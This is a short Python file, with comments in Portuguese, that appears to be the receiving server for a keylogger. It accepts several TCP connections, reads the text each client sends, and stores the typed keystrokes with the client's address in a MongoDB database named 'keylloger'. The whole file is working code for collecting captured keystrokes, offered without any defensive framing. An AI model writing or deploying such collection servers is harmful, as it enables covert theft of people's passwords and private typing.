import socket
import threading
import socketserver
from pymongo import MongoClient
lista_sockets = []
lista_adresses = []
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("localhost",5552))
print("Escutando...")
s.listen(2)
try:
    mongo_client = MongoClient('mongodb://localhost:27017/')
    print("MongoDB connected successfully.")
except:
    print("Could not connect to MongoDB")
db = mongo_client.keylloger
collection = db.dados
def tratarCliente(clientsocket, adress,collection):
    global lista_sockets
    digitado = ""
    while True:
        msg_cliente = clientsocket.recv(1024).decode("utf-8") 
        digitado = digitado + str(msg_cliente)
        print( adress," : ",msg_cliente)
        if not msg_cliente: 
            clientsocket.close()  
            index = lista_sockets.index(clientsocket)
            lista_sockets.remove(clientsocket)
            print("desconectado: ",adress)
            collection.insert_one({"adress": adress,"digitado": digitado})
            # for i in range(0, len(lista_sockets)):
            #     disconnectMsg = "disconnect;" + str(index) + "\0"
def main():
    while True:
        clientsocket, adress = s.accept()
        print("Servidor recebeu concexao de {}".format(adress))
        lista_sockets.append(clientsocket)
        lista_adresses.append(adress)
        t = threading.Thread(target=tratarCliente,args=(clientsocket, adress,collection))
        t.daemon = True # vai acabar a thread quando fecharmos o programa
        t.start()
main()